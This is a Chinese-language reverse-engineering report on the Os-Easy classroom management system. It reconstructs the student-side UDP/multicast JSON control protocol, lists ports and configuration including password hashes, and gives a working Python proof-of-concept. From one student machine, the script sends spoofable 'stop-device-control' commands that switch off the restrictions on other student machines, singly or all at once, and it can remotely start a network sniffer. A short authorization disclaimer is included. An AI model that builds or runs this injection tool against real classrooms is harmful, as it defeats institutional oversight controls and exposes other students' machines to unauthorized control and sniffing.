# Os-Easy 学生机A→学生机B 管控指令注入 - 完整研究文档

> **目标**：在学生机A上（无需教师端），通过 Python 向学生机B发送管控指令
> **方法**：静态逆向（Ghidra 12.1.3）分析学生端组件，还原 UDP 管控协议
> **状态**：静态分析完成 ✅ / 动态验证待进行（回机房后）

---

## 📦 系统架构总览

```
┌──────────────────────────────────────────────────────────────┐
│ 教师端 Teacher.exe                                           │
│  ├─ 构造 JSON 管控指令（NPDControl.xml UI）                  │
│  ├─ POST http://{ip}:{port}/encode 加密 (DES-EDE2-CBC+HMAC)  │
│  └─ 通过 UDP:8040 / 组播 7778 下发给学生端                   │
└──────────────────────────┬───────────────────────────────────┘
                           │ 网络（UDP/组播）
                           ▼
┌──────────────────────────────────────────────────────────────┐
│ 学生端 LissHelper.exe（★核心管控接收器）                     │
│  ├─ Boost.Asio UDP socket (SOCK_DGRAM + IPPROTO_UDP)         │
│  ├─ WSARecvFrom / WSASendTo 收发                             │
│  ├─ JsonCpp 解析 JSON 指令                                   │
│  └─ 按 "type" 字段分发到各执行组件                           │
│      ├─→ LISSClientSDK.dll（LISS_SDK_* 系列）                │
│      ├─→ DeviceControl.exe（网络/设备/进程管控）              │
│      ├─→ LISSNetInfoSniffer.exe（网络嗅探）                   │
│      └─→ LockKeyboard.dll（键盘锁定）                         │
└──────────────────────────────────────────────────────────────┘
```

---

## 🔬 第一部分：静态逆向结论（已确认）

### 1.1 LissHelper.exe = 学生端管控指令接收器

**传输协议**：UDP
- `WSASocketW(AF_INET, SOCK_DGRAM(2), IPPROTO_UDP(17))` ← 反汇编确认
- Boost.Asio UDP socket（`udp@ip@asio@boost` 类）
- `WSARecvFrom`（收）/ `WSASendTo`（发）

**数据格式**：JSON（JsonCpp 解析）

**分发机制**：读取 JSON 中的 `"type"` 字段进行分支

### 1.2 完整指令集（type 字段）

| type 值 | 功能 | 附带字段 | 执行动作 |
|---------|------|---------|---------|
| `support-use-device-control` | 查询管控支持 | networktraffic / network / device / process | 返回 success/failed |
| `stop-device-control` | **停止全部管控** | stopnetworktraffic / stopnetwork / stopdevice / stopprocess | 调用 `LISS_SDK_SendMMCStopStrategy()` |
| `send-broadcast-type` | **下发广播类型** | broadcasttype, start | 调用 `LISS_SDK_SendBroadcastTypeInternal()` |
| `can-broadcast` | 查询能否广播 | - | 返回 success/failed |
| `check-liss-sdk` | 检查 LISS SDK | - | 返回 success/failed |
| `start-lissNet` | **启动网络嗅探** | ip, mac, filepath | 杀旧进程 + `CreateProcessA("x86\LISSNetInfoSniffer.exe ip mac filepath")` |

### 1.3 LissHelper 关键执行逻辑（反编译还原）

```cpp
// FUN_0040c000 反编译伪代码
if (json["type"] == "support-use-device-control") {
    result = LISS_SDK_IsSupportMMCStrategy(
        json["networktraffic"], json["network"], json["device"], json["process"]);
    reply("success" / "failed");
}
else if (json["type"] == "send-broadcast-type") {
    LISS_SDK_SendBroadcastTypeInternal(json["broadcasttype"], json["start"]);
}
else if (json["type"] == "stop-device-control") {
    LISS_SDK_SendMMCStopStrategy(
        json["stopnetworktraffic"], json["stopnetwork"],
        json["stopdevice"], json["stopprocess"]);
    reply("success");
}
else if (json["type"] == "start-lissNet") {
    // 枚举进程杀掉 LISSNetInfoSniffer.exe
    CreateToolhelp32Snapshot();
    Process32FirstW/NextW(); _wcsicmp(name, L"LISSNetInfoSniffer.exe");
    OpenProcess(); TerminateProcess();
    // 启动新嗅探器
    CreateProcessA(NULL, "x86\\LISSNetInfoSniffer.exe <ip> <mac> <filepath>", ...);
}
```

### 1.4 LissHelper 依赖配置

- 注册表路径：`HKEY_LOCAL_MACHINE\SOFTWARE\LISSClient\liss\InstallPath`
- 加载：`LISSClientSDK.dll`（x86/x64 子目录）
- 导出函数：
  - `LISS_SDK_InitIntance`
  - `LISS_SDK_FreeIntance`
  - `LISS_SDK_IsLoginUiGoingToShow`
  - `LISS_SDK_SendBroadcastTypeInternal`
  - `LISS_SDK_IsSupportMMCStrategy`
  - `LISS_SDK_SendMMCStopStrategy`
  - `LISS_SDK_SendMMCMonitorKeywordFilePath`

---

## 🗄️ 第二部分：完整配置与端口表（core.conf）

配置文件路径：`{安装目录}\skin\core.conf`
格式：`/键/值/`

### 2.1 端口总表

| 配置键 | 端口 | 用途 | 类型 |
|--------|------|------|------|
| **`UdpMessageControllerPort`** | **8040** | **★ 管控指令 UDP 端口（核心）** | UDP |
| `ScreenUdpVerityPort` | 7788 | 屏幕广播验证 | UDP |
| `MacUdpVerityPort` | 8898 | MAC 验证 | UDP |
| `AudioUdpVerityPort` | 8908 | 音频验证 | UDP |
| `MultiCastPort` | 7778 | 组播 | UDP |
| `ChannleScanPort` | 7777 | 频道扫描 | UDP |
| `MacroPort` | 8888 | 宏 | TCP/UDP |
| `LocalAudioPort` | 8889 | 本地音频 | UDP |
| `RegisterServerPort` | 8003 | 注册服务 | TCP |
| `ConnectPort` | 9003 | 连接 | TCP |
| `TalkbackServerPort` | 9001 | 对讲服务 | TCP |
| `FileTransferPort` | 9100 | 文件传输 | TCP |
| `FileNodeManagerPort` | 8555 | 文件节点管理 | TCP |
| `FileReportPort` | 9979 | 文件报告 | TCP |
| `StudentDemoPort` | 9201 | 学生演示 | TCP |
| `StudentDemoVerityPort` | 9202 | 演示验证 | UDP |
| `SharedDeskTopAppBindPort` | 9101 | 共享桌面 | TCP |
| `OuterDataPort` | 9997 | 外部数据 | TCP |
| `VdiChannelServerPort` | 8002 | VDI 通道 | TCP |
| `DaasServerPort` | 443 | DaaS 服务 | HTTPS |

### 2.2 其他关键配置

```
/IpAddressFilter//                 ← 空 = 无 IP 过滤（利于注入）
/RegisterServerIp/0.0.0.0/
/RegisterServerBindingMac/1/
/RegisterType/0/
/Limit/1/                          ← 管控使能
/LockSeat/0/
/LockedAfterNetBroken/0/
/StuAutoStart/1/
/TransferType/multicast/           ← 传输类型: 组播
/UsingHttps/1/
/CompressMode/h264/
/LogLevel/info/
/MD5/RPYUVVPT8V99XN6ZQ6ZUWNUPSXVZZR8X/
/Password/DA97E410CB7A766DB0189A34EA39CC0DA3B521ED5EFD473581C02866B88E8758043FAE93BA67871F82A1A191198A7755/
/StuInternet/DA97E410CB7A766DB0189A34EA39CC0D8742BFAB48EDC2F7BCDF7585C0C46F46C3504CEE05AC0B3A2A37F4E40E3F643DB6D784A4A43161B597035E53A44B6886/
/DaasShutdownPassword/DA97E410CB7A766DB0189A34EA39CC0DA3B521ED5EFD473581C02866B88E8758043FAE93BA67871F82A1A191198A7755/
```

> ⚠️ `Password` / `StuInternet` / `DaasShutdownPassword` 为 SHA-256/MD5 哈希（64/32 位十六进制），用于认证，尚未还原具体算法。

---

## 🔀 第二部分补充：组播路径专项分析（对应早期 AI 研究方向）

> 早期分析曾研究"加入组播"方向。本次静态逆向对组播路径做了专项排查，并结合教师端 UI 证据，结论如下：

### 2.3 教师端 UI 证据：管控面向全体（用户实测确认）

从 `skin/BehaviorControl.xml` 完整还原教师端行为管控窗口：

```
行为管控 [550×650]
├─ 程序使用限制 (CBProgramLimit)
│   ├─ 添加禁用进程名：+ [EditProgram] [BtnAddProgram]
│   └─ 进程名 | 状态 | 操作 [ListProgram]
├─ 禁用外网 (CBInternetLimit)
│   ├─ 添加例外网址：+ [EditInternet] [BtnAddInternet]
│   └─ 网址 | 状态 | 操作 [ListInternet]
├─ 设备使用限制 (CBDeviceLimit)
│   ├─ 禁用U盘 (CBULimit)
│   ├─ 禁用虚拟光驱 (CBVirtualCDLimit)
│   └─ 禁用光驱 (CBCDLimit)
└─ [确 定] [取 消]
```

**关键发现**：
- 窗口**没有任何"选择目标学生机"的控件**（无多选列表、无分组选择）
- 只有"添加规则"和"规则列表"
- 用户实测确认：**提示为"对全体学生机生效，不区分学生机"**

> 📌 **结论：管控指令天生面向全体。** 这与"组播通道下发"高度吻合——教师端发一条组播，全体学生端同时收到。

### 2.4 组播相关证据链

| 证据 | 出处 | 说明 |
|------|------|------|
| `/TransferType/multicast/` | core.conf | **传输类型配置 = 组播** |
| `/MultiCastPort/7778/` | core.conf | 组播端口 |
| `multicast` / `udpSingle` | Teacher.exe | 教师端**两种传输模式**（组播 vs UDP单播）切换逻辑 |
| `TransferType` 读取 | MultiClient.exe FUN_0042b8c0 | MultiClient 运行时读配置判断传输类型 |
| `App::StartMulticast` / `App::StopMulticast` / `Multicast` 类 | MultiClient.exe | 组播启停封装 |
| `stopMulticast: %s` | MultiClient.exe | 组播停止日志（参数为桌面名，如 NetTeachingDesktop） |
| `uv_udp_set_multicast_interface/loop/ttl` | libuv.dll | client_console.exe 依赖的组播接口 |
| **`setsockopt` (ordinal 21)** | LissHelper.exe WS2_32 导入表 | **加入组播组必须用 setsockopt(IP_ADD_MEMBERSHIP)** |
| `inet_addr` (ordinal 10) + `htons` (ordinal 9) | LissHelper.exe WS2_32 导入表 | 组播组地址/端口转换 |
| `224.2.127.254` | avformat-57.dll / ffmpeg.exe / libsap_plugin.dll | ⚠️ **SAP 协议标准组播地址**（FFmpeg/VLC 流媒体会话发现用），与管控指令**无关**，需排除 |

### 2.5 组播通道判断（更新）

**核心推理**：
1. 普通 UDP 单播**不需要** `setsockopt`
2. **加入组播组必须** `setsockopt(sock, IPPROTO_IP, IP_ADD_MEMBERSHIP)`
3. LissHelper.exe 导入了 `setsockopt` + `inet_addr` + `bind` + `htons` + `WSARecvFrom`
4. 教师端 UI 确认管控面向全体（无选择目标机制）

> 📌 **强烈暗示：管控指令走「组播」通道下发。**
> - 教师端：向组播组发一条 JSON → 全体学生机 LissHelper（已加入组播组）同时收到
> - 这完美解释了"对全体生效、不区分学生机"

**MultiClient 的 `stopMulticast: %s`（参数=桌面名）** 说明组播通道同时用于**屏幕广播**（NetTeachingDesktop 等桌面会话），管控指令可能共用组播基础设施。

### 2.6 组播 vs 单播：两种可能架构

| 架构 | 发送方式 | 特征 | 对工具的影响 |
|------|---------|------|------------|
| **A. 组播下发** | 教师端→组播组(7778)→全体学生 | 一条指令全体生效，无需学生列表 | 工具需**加入组播组**发数据 → 天然支持"全体"；"单台"需用单播或特定字段 |
| **B. 逐台单播** | 教师端→各学生机IP:8040 | 需要学生机列表（从注册服务8003获取） | 工具需**枚举学生机**；"全体"=遍历发送 |

> ⚠️ 两种架构都合理，需回机房抓包最终确认。但**组播可能性更高**（UI 面向全体 + LissHelper 有 setsockopt）。

---

## 🐍 第三部分：Python PoC 方案（单台 + 全体 双模式）

> 💡 **设计目标**：原生教师端管控只支持"全体"，我们要做的工具**同时支持"单台"和"全体"**：
> - **单台** → UDP 单播发送到指定学生机 IP:8040（若 8040 允许跨机）
> - **全体** → ① 组播发送（若管控走组播） ② 或遍历学生机列表逐台单播
> - 组播地址需回机房抓 IGMP 确认，下方给出**探测式实现**

### 3.1 基础发送函数

```python
#!/usr/bin/env python3
"""
Os-Easy 学生机管控指令注入工具（静态分析版）
支持：单台单播 / 全体组播 / 全体遍历单播
仅在授权测试环境使用！
"""
import socket
import json
import struct
import ipaddress

# ===== 配置（回机房实测后替换）=====
CTRL_PORT    = 8040            # UdpMessageControllerPort（core.conf 默认）
MCAST_PORT   = 7778            # MultiCastPort（core.conf 默认）
MULTICAST_IP = "239.255.42.99" # ★占位：需回机房抓 IGMP/Wireshark 确认真实组播组
MAGIC        = b"udPPPPj"      # 可能的载荷魔数（若需要）
BROADCAST_IP = "255.255.255.255"

def _frame(payload: dict, use_magic: bool = False) -> bytes:
    """JSON 载荷 → 字节（可选加魔数头）"""
    data = json.dumps(payload).encode("utf-8")
    return (MAGIC + data) if use_magic else data


# ================= 单台发送（UDP 单播）=================
def send_single(ip: str, payload: dict, port: int = CTRL_PORT, use_magic: bool = False):
    """向单个学生机 IP 发送管控指令"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(3)
    try:
        sock.sendto(_frame(payload, use_magic), (ip, port))
        print(f"[单台] -> {ip}:{port}  type={payload.get('type','?')}")
        # 尝试接收回包（若 LissHelper 有响应）
        try:
            reply, addr = sock.recvfrom(2048)
            print(f"[回包] {addr}: {reply[:200]}")
        except socket.timeout:
            print("[*] 无回包（也可能已执行）")
    finally:
        sock.close()


# ================= 全体发送（组播）=================
def send_all_multicast(payload: dict, mcast_ip: str = MULTICAST_IP,
                       port: int = MCAST_PORT, use_magic: bool = False):
    """向组播组发送管控指令（若系统走组播通道）"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 32)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_LOOP, 1)
    try:
        sock.sendto(_frame(payload, use_magic), (mcast_ip, port))
        print(f"[全体-组播] -> {mcast_ip}:{port}  type={payload.get('type','?')}")
    finally:
        sock.close()


# ================= 全体发送（遍历单播）=================
def send_all_unicast(ip_list: list, payload: dict, port: int = CTRL_PORT,
                     use_magic: bool = False):
    """遍历学生机 IP 列表逐台单播（当组播不可用时）"""
    for ip in ip_list:
        try:
            send_single(ip, payload, port, use_magic)
        except Exception as e:
            print(f"[!] {ip} 发送失败: {e}")


# ================= 组播组探测（回机房后先用） =================
def probe_multicast():
    """抓取 3 秒内到达的组播包，观察课堂时 Os-Easy 用的组播组"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    # 绑定常见组播端口（替换为实际测到的）
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    for grp in ["239.255.42.99", "224.2.127.254", "239.255.255.250"]:
        try:
            mreq = struct.pack("4sl", socket.inet_aton(grp), socket.INADDR_ANY)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
            print(f"[探测] 已加入组播组 {grp}")
        except OSError as e:
            print(f"[!] 加入 {grp} 失败: {e}")
    sock.settimeout(5)
    sock.bind(("0.0.0.0", MCAST_PORT))
    try:
        while True:
            data, addr = sock.recvfrom(4096)
            print(f"[抓包] {addr} -> {data[:200]}")
    except socket.timeout:
        print("[探测] 5 秒无组播包")


# ================= 指令集（单台示例） =================
def stop_control_single(ip):
    send_single(ip, {
        "type": "stop-device-control",
        "stopnetworktraffic": 1, "stopnetwork": 1,
        "stopdevice": 1, "stopprocess": 1
    })

def stop_control_all(ip_list=None):
    """全体：先尝试组播，再用遍历单播兜底"""
    payload = {
        "type": "stop-device-control",
        "stopnetworktraffic": 1, "stopnetwork": 1,
        "stopdevice": 1, "stopprocess": 1
    }
    send_all_multicast(payload)
    if ip_list:
        send_all_unicast(ip_list, payload)


if __name__ == "__main__":
    import sys
    # 安全默认：探测组播（无害）
    probe_multicast()
```

### 3.2 测试清单（单台 → 全体 渐进）

| 步骤 | 指令 | 目标 | 预期 | 风险 |
|------|------|------|------|------|
| ① 探测组播 | `probe_multicast()` | 本机 | 发现 Os-Easy 实际组播组 | 无 |
| ② 连通性(单台) | `support-use-device-control` → 单台IP | 学生机B | B 有日志响应 | 无 |
| ③ SDK 检查(单台) | `check-liss-sdk` → 单台IP | 学生机B | 返回 success/failed | 无 |
| ④ 停止管控(单台) | `stop_control_single(B_IP)` | 学生机B | B 管控被停止 | 可逆 |
| ⑤ 停止管控(全体) | `stop_control_all(ip_list)` | 全体 | 全部收到 | 可逆 |
| ⑥ 广播测试 | `send-broadcast-type` | 单台/全体 | 响应广播 | 中等 |
| ⑦ 嗅探启动 | `start-lissNet` | 单台 | B 启动 LISSNetInfoSniffer.exe | 中等 |

> **安全顺序**：先在**单台**验证每条指令，确认格式后，再升级到**全体**。

---

## 🔍 第四部分：待动态验证项（回机房后）

| # | 验证项 | 方法 | 影响 |
|---|--------|------|------|
| 1 | **8040 是否 LissHelper 监听** | `netstat -ano \| findstr UDP \| findstr 8040` | 确定单播端口 |
| 2 | **8040 监听地址 0.0.0.0 vs 127.0.0.1** | 同上（看 Local Address） | **决定单台能否跨机注入** |
| 3 | **实际组播组地址** | `netsh interface ip show joins` / Wireshark 过滤 igmp | 全体组播通道关键 |
| 4 | **7778 是否承载管控指令** | 教师端发管控时抓包看目标地址 | 确认组播 vs 单播 |
| 5 | **是否需 `udPPPPj` 魔数** | 先发无魔数包，无效则加魔数 | 载荷格式 |
| 6 | **是否校验源 IP/口令** | 观察响应日志 | 是否需要伪造教师机 IP |
| 7 | **学生机列表获取** | 抓注册服务(8003) 交互 / 教师端 IP 表 | 全体遍历单播需要 |
| 8 | **JSON 是否需完整字段** | 逐字段增减测试 | 最小可用载荷 |

### 快速判断矩阵（更新）

```
场景A: netstat 显示 0.0.0.0:8040
  → 单台注入：直接 UDP 单播到 B:8040 ✅
  → 全体注入：遍历单播 or 组播（需确认组播地址）

场景B: netstat 显示 127.0.0.1:8040（仅本地）
  → 单台注入：需先控制学生机B本机（无法纯远程）❌
  → 全体注入：走组播通道（7778）或注册服务 → 仍有希望 ✅

场景C: 抓到管控走组播（7778 + 某 239.x 地址）
  → 全体注入：加入组播组发 JSON → 全体生效 ✅（最符合原生行为）
  → 单台注入：需要知道组播帧里是否有"目标IP过滤字段"（待验证）
```

---

## 🛡️ 安全与合规提醒

1. **授权范围**：仅在被授权/自有测试环境验证（用户已确认）✅
2. **测试顺序**：从无害查询 → 可逆指令 → 实际管控，逐步升级
3. **法律合规**：避免在未授权设备上使用，遵守《网络安全法》及相关法规
4. **可逆性**：`stop-device-control` 等指令可恢复，`start-lissNet` 会启动进程（需清理）

---

## 📁 关联文档

| 文档 | 内容 |
|------|------|
| `CONTROL_COMMAND_PROTOCOL_REPORT.md` | 教师端→学生端 JSON 指令协议全解析 |
| `STUDENT_TO_STUDENT_CONTROL_FEASIBILITY.md` | 早期可行性分析 |
| `DEVICECONTROL_ANALYSIS_REPORT.md` | DeviceControl 执行组件分析 |
| `MULTICLIENT_ANALYSIS_REPORT.md` | MultiClient 中继组件分析 |
| `PROJECT_SUMMARY.md` | Os-Easy 项目总览 |

---

**分析工具**：Ghidra 12.1.3 + objdump + strings
**分析对象**：LissHelper.exe / Teacher.exe / Student.exe / skin/core.conf
**报告时间**：2026-09-06
**状态**：静态逆向完成，等待测试环境动态验证
